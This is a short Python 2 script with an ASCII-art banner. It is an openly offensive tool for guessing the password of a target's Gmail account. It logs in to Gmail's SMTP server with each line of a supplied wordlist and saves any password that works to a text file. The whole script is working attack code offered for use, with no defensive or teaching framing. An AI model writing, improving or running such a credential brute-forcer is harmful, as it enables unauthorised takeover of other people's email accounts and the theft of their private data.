print"__   _______       _     _                   ___  ___          _             ______                       "
print"\ \ / /_   _|  _  | |   (_)                  |  \/  |         | |            | ___ \                      "
print" \ V /  | |   (_) | |    _ _ __  _   ___  __ | .  . | __ _ ___| |_ ___ _ __  | |_/ /__ _  ___ ___         "
print"  \ /   | |       | |   | | '_ \| | | \ \/ / | |\/| |/ _` / __| __/ _ \ '__| |    // _` |/ __/ _ \        "
print"  | |   | |    _  | |___| | | | | |_| |>  <  | |  | | (_| \__ \ ||  __/ |    | |\ \ (_| | (_|  __/        "
print"  \_/   \_/   (_) \_____/_|_| |_|\__,_/_/\_\ \_|  |_/\__,_|___/\__\___|_|    \_| \_\__,_|\___\___|        "
print"                                                                                                          "
print"                                                                                                          "
import smtplib
from os import system
def brutus():
        smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
        smtpserver.ehlo()
        smtpserver.starttls()

        user = raw_input("Enter your targets gmail address: ")
        passwfile = raw_input("Enter the password file name: ")
        passwfile = open(passwfile, "r")

        for password in passwfile:
                try:
                        smtpserver.login(user, password)

                        print"[+] Password Found: %s" % password
                        file = open("output.txt", "w")
                        file.write("The user is:" + user + "  " + "The password is: " +  password)
                        file.close()
                        break;
                except smtplib.SMTPAuthenticationError:
                        print"[!] Password incorrect: %s" % password

print '[1] start the attack'
print '[2] exit'
option = input('>')
if option == 1:
        brutus()
else:
        system('clear')
        exit()
